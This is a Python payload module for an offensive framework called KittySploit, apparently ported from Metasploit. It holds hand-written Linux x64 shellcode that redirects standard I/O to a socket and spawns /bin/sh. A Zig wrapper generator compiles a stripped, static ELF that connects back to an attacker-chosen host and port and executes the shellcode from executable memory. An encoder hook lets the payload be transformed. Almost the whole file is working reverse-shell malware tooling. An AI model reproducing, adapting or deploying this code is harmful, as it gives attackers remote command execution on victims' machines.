#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Linux x64 Command Shell Stage
Author: KittySploit Team
Version: 1.0.0

This payload is a "stage" that expects a socket to already be connected.
It performs:
- dup2 loop to redirect stdin/stdout/stderr to the socket (fd 3)
- execve("/bin/sh") to spawn a shell

This is typically used after a stager has established the connection.
The socket file descriptor is expected to be 3 (after stdin=0, stdout=1, stderr=2).

Original Metasploit module: payload/linux/x64/shell/reverse_tcp
"""

from kittysploit import *
import os
import subprocess
import struct
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Linux x64 Command Shell Stage',
        'description': 'Linux x64 shell stage - expects socket fd 3 to be connected (staged)',
        'author': 'KittySploit Team (based on Metasploit module by ricky)',
        'version': '1.0.0',
        'category': 'singles',
        'arch': Arch.X64,
        'platform': Platform.LINUX,
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
        'references': [
            'https://github.com/rapid7/metasploit-framework'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    encoder = OptString('', 'Encoder', False, True)
    generate_exe = OptBool(False, 'Generate executable ELF binary', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    
    def generate(self):
        """
        Generate the Linux x64 shell stage payload.
        
        This shellcode:
        1. Loops through file descriptors 2, 1, 0 (stderr, stdout, stdin)
        2. Calls dup2(socket_fd=3, fd) for each to redirect I/O to the socket
        3. Executes execve("/bin/sh", NULL, NULL) to spawn a shell
        
        Note: This stage expects socket file descriptor 3 to already be connected.
        """
        shellcode = b""
        
        # dup2 loop: redirect stdin/stdout/stderr to socket (fd 3)
        # Start with rsi = 3, then decrement: 2 (stderr), 1 (stdout), 0 (stdin)
        shellcode += b"\x6a\x03"      # pushq  $0x3          ; push 3
        shellcode += b"\x5e"          # pop    %rsi          ; pop into rsi (start with fd 3)
        shellcode += b"\x48\xff\xce"  # dec    %rsi          ; decrement rsi (now 2 = stderr)
        shellcode += b"\x6a\x21"      # pushq  $0x21        ; syscall number for dup2
        shellcode += b"\x58"          # pop    %rax          ; pop syscall number
        shellcode += b"\x0f\x05"      # syscall              ; dup2(3, rsi)
        shellcode += b"\x75\xf6"      # jne    3 <dup2_loop> ; loop if rsi != 0 (jumps back to dec %rsi)
        
        # execve("/bin/sh", NULL, NULL)
        shellcode += b"\x6a\x3b"      # pushq  $0x3b         ; syscall number for execve
        shellcode += b"\x58"          # pop    %rax          ; pop syscall number
        shellcode += b"\x99"          # cltd                 ; sign extend eax into edx (clears rdx)
        shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f"  # movabs $0x68732f6e69622f,%rbx  ; "/bin/sh" (reversed, null-terminated)
        shellcode += b"\x73\x68\x00"  # [continuation of movabs] ; "/bin/sh\0"
        shellcode += b"\x53"          # push   %rbx          ; push "/bin/sh\0" onto stack
        shellcode += b"\x48\x89\xe7"  # mov    %rsp,%rdi     ; rdi = pointer to "/bin/sh\0"
        shellcode += b"\x52"          # push   %rdx          ; push NULL (argv terminator)
        shellcode += b"\x57"          # push   %rdi          ; push pointer to "/bin/sh"
        shellcode += b"\x48\x89\xe6"  # mov    %rsp,%rsi     ; rsi = pointer to argv array ["/bin/sh", NULL]
        shellcode += b"\x0f\x05"      # syscall              ; execve("/bin/sh", ["/bin/sh"], NULL)
        
        # Apply encoder if specified
        if self.encoder:
            shellcode = self._apply_encoder(shellcode)
        
        if self.generate_exe:
            return self._generate_executable(shellcode)
        
        return shellcode
    
    def _apply_encoder(self, payload: bytes) -> bytes:
        """
        Apply encoder to payload if encoder option is set.
        
        Args:
            payload: Raw payload bytes
            
        Returns:
            Encoded payload bytes
        """
        try:
            import importlib
            from core.utils.function import pythonize_path
            
            # Load encoder module
            encoder_path = pythonize_path(self.encoder)
            encoder_full_path = ".".join(("modules", encoder_path))
            encoder_module = getattr(importlib.import_module(encoder_full_path), "Module")()
            
            # Set framework reference if available
            if hasattr(self, 'framework') and self.framework:
                encoder_module.framework = self.framework
            
            # Apply encoding
            if hasattr(encoder_module, 'encode'):
                encoded_payload = encoder_module.encode(payload)
                print_success(f"Applied encoder: {self.encoder}")
                return encoded_payload
            else:
                print_error(f"Encoder module {self.encoder} does not have encode() method")
                return payload
                
        except ImportError as e:
            print_error(f"Failed to import encoder module: {self.encoder} - {e}")
            return payload
        except Exception as e:
            print_error(f"Failed to apply encoder: {e}")
            return payload
    
    def _generate_executable(self, stage_shellcode: bytes) -> bytes:
        """
        Generate a complete ELF executable using Zig that:
        1. Establishes TCP reverse connection
        2. Executes the stage shellcode
        
        Returns the shellcode as bytes (for compatibility) but also saves the ELF binary.
        """
        try:
            # Generate Zig wrapper code
            zig_code = self._generate_zig_wrapper(stage_shellcode)
            
            # Determine output directory
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                output_path = Path("output") / "linux_x64_shell"
            
            output_path.mkdir(parents=True, exist_ok=True)
            
            # Save Zig source
            src_dir = output_path / "src"
            src_dir.mkdir(parents=True, exist_ok=True)
            zig_source = src_dir / "shell.zig"
            with open(zig_source, 'w', encoding='utf-8') as f:
                f.write(zig_code)
            
            # Compile to ELF using framework's Zig compiler
            binary_path = output_path / "shell"
            if self.compile_zig(
                source_code=zig_code,
                output_path=str(binary_path),
                target_platform='linux',
                target_arch='x86_64',
                optimization='ReleaseSmall',
                strip=True,
                static=True
            ):
                print_success(f"Executable generated: {binary_path}")
                print_info(f"To use: chmod +x {binary_path} && ./{binary_path}")
                return stage_shellcode
            else:
                print_warning("ELF compilation failed, returning raw shellcode")
                return stage_shellcode
                
        except Exception as e:
            print_error(f"Error generating executable: {e}")
            return stage_shellcode
    
    def _generate_zig_wrapper(self, stage_shellcode: bytes) -> str:
        """Generate Zig wrapper code that connects and executes stage shellcode"""
        
        # Convert shellcode to Zig array
        shellcode_hex = ', '.join(f'0x{b:02x}' for b in stage_shellcode)
        
        zig_code = f"""const std = @import("std");
const os = std.os;
const posix = std.posix;
const mem = std.mem;

const stage_shellcode = [_]u8{{{shellcode_hex}}};

fn connectToHost(host: []const u8, port: u16) !posix.fd_t {{
    const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
    errdefer posix.close(sock);
    
    var addr: posix.sockaddr.in = undefined;
    addr.family = posix.AF.INET;
    addr.port = @byteSwap(port);
    
    var ip_parts: [4]u8 = undefined;
    var part_idx: usize = 0;
    var current: u32 = 0;
    for (host) |c| {{
        if (c == '.') {{
            if (part_idx >= 4) return error.InvalidAddress;
            ip_parts[part_idx] = @intCast(current);
            part_idx += 1;
            current = 0;
        }} else if (c >= '0' and c <= '9') {{
            current = current * 10 + (c - '0');
        }} else {{
            return error.InvalidAddress;
        }}
    }}
    if (part_idx != 3) return error.InvalidAddress;
    ip_parts[3] = @intCast(current);
    
    const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) | 
                         (@as(u32, ip_parts[1]) << 16) | 
                         (@as(u32, ip_parts[2]) << 8) | 
                         @as(u32, ip_parts[3]);
    addr.addr = @byteSwap(ip_addr);
    
    try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
    return sock;
}}

pub fn main() !void {{
    const host = "{self.lhost}";
    const port: u16 = {self.lport};
    
    const sock = try connectToHost(host, port);
    defer posix.close(sock);
    
    _ = try posix.dup2(sock, 3);
    _ = try posix.dup2(sock, 0);
    _ = try posix.dup2(sock, 1);
    _ = try posix.dup2(sock, 2);
    
    const page_size = 4096;
    const aligned_size = ((stage_shellcode.len + page_size - 1) / page_size) * page_size;
    
    const shellcode_mem = try posix.mmap(
        null,
        aligned_size,
        posix.PROT.READ | posix.PROT.WRITE | posix.PROT.EXEC,
        .{{ .TYPE = .PRIVATE, .ANONYMOUS = true }},
        -1,
        0
    );
    defer posix.munmap(shellcode_mem);
    
    @memcpy(shellcode_mem[0..stage_shellcode.len], &stage_shellcode);
    
    const func = @as(*const fn () void, @ptrCast(shellcode_mem.ptr));
    func();
}}
"""
        return zig_code

